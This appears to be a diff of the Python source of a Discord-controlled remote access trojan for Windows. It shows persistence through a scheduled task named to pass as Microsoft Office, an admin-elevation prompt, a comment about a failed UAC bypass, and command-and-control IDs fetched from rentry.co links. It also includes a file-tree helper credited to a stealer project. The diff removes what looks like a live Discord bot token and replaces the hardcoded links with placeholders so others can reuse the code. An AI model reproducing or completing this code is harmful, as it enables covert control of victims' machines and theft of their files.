@@ -58,6 +58,7 @@ def adm() -> bool:
         return False
 
 
+# UAC BYPASS DOES NOT WORK
 if not adm():
     task_name = 'MicrosoftOffice-kit'
     script_path = os.path.abspath(sys.executable)
@@ -96,13 +97,13 @@ subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOL
 
 
 prefix = '>'
-serverid = requests.get('https://rentry.co/75xvys3e/raw').text.strip()
+serverid = requests.get('').text.strip() # Replace with a RAW link to ur server id
 serverid = int(serverid)
-userid = requests.get('https://rentry.co/qrmxqe3k/raw').text.strip()
+userid = requests.get('').text.strip()# Replace with a RAW link to ur user id
 userid = int(userid)
 
 tokens = [
-    'MTI1OTk1MTcyMjY3NjA5NzAyNA.GtcIMW.5P9iKCyt3Roqu40BxGji4O2FcvzDYN8koiLbvE'# Main
+    '' # Replace with ur bot tokens
 ]
 channel_names = [
     'cmds',
@@ -124,7 +125,6 @@ class utils:
         except:
             return False
     
-    # from https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Components/stub.py (TEMPORARY)
     def promptadmin(path: str) -> bool:
         return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42
 
@@ -151,7 +151,7 @@ class utils:
             for i, file in enumerate(files):
                 file_path = os.path.join(root, file)
                 size = os.path.getsize(file_path)
-                formatted_size = utils.format_size(size)  # Assuming you have a function to format size
+                formatted_size = utils.format_size(size)
                 if i == len(files) - 1:
                     tree += f'{subindent}└── 📄 - {file} ({formatted_size})\n'
                 else:
